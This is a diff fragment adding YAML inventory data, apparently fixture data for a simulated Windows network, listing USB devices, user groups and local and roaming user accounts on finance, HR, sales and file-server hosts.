+- _hosts: hr-ws-03
+  usb_address: "3"
+  usb_port: "2"
+  vendor: Logitech, Inc.
+  vendor_id: 046d
+  version: "12.11"
+  model: Unifying Receiver
+  model_id: c52b
+  serial: ""
+  class: "3"
+  subclass: "1"
+  protocol: "2"
+  removable: "1"
+- _hosts: sales-ws-21
+  usb_address: "3"
+  usb_port: "2"
+  vendor: Logitech, Inc.
+  vendor_id: 046d
+  version: "12.11"
+  model: Unifying Receiver
+  model_id: c52b
+  serial: ""
+  class: "3"
+  subclass: "1"
+  protocol: "2"
+  removable: "1"
+user_groups:
+- uid: "500"
+  gid: "544"
+- uid: "501"
+  gid: "546"
+- _hosts: file-srv-01
+  uid: "1201"
+  gid: "545"
+- _hosts: finance-ws-12
+  uid: "1105"
+  gid: "545"
+- _hosts: finance-ws-13
+  uid: "1106"
+  gid: "545"
+- _hosts: hr-ws-03
+  uid: "1108"
+  gid: "545"
+- _hosts: sales-ws-21
+  uid: "1109"
+  gid: "545"
+users:
+- uid: "500"
+  gid: "513"
+  uid_signed: "500"
+  username: Administrator
+  description: Built-in account for administering the computer/domain
+  directory: ""
+  type: local
+  shell: "C:\\Windows\\system32\\cmd.exe"
+- uid: "501"
+  gid: "513"
+  uid_signed: "501"
+  username: Guest
+  description: Built-in account for guest access to the computer/domain
+  directory: ""
+  type: local
+  shell: "C:\\Windows\\system32\\cmd.exe"
+- uid: "503"
+  gid: "513"
+  uid_signed: "503"
+  username: DefaultAccount
+  description: A user account managed by the system.
+  directory: ""
+  type: local
+  shell: "C:\\Windows\\system32\\cmd.exe"
+- _hosts: file-srv-01
+  uid: "1201"
+  gid: "513"
+  uid_signed: "1201"
+  username: svc_backup
+  description: Backup service account
+  directory: "C:\\Users\\svc_backup"
+  type: roaming
+  shell: "C:\\Windows\\system32\\cmd.exe"
+- _hosts: finance-ws-12
+  uid: "1105"
+  gid: "513"
+  uid_signed: "1105"
+  username: a.harper
+  description: Finance - Accounts Payable
+  directory: "C:\\Users\\a.harper"
+  type: roaming
+  shell: "C:\\Windows\\system32\\cmd.exe"
+- _hosts: finance-ws-13
+  uid: "1106"
+  gid: "513"
+  uid_signed: "1106"
+  username: s.novak
+  description: Finance
+  directory: "C:\\Users\\s.novak"
+  type: roaming
+  shell: "C:\\Windows\\system32\\cmd.exe"
+- _hosts: hr-ws-03
+  uid: "1108"
+  gid: "513"
+  uid_signed: "1108"
+  username: j.chen
+  description: HR
+  directory: "C:\\Users\\j.chen"
+  type: roaming
+  shell: "C:\\Windows\\system32\\cmd.exe"
+- _hosts: sales-ws-21
+  uid: "1109"
+  gid: "513"
+  uid_signed: "1109"
+  username: p.ivanova
+  description: Sales
+  directory: "C:\\Users\\p.ivanova"
+  type: roaming
+  shell: "C:\\Windows\\system32\\cmd.exe"
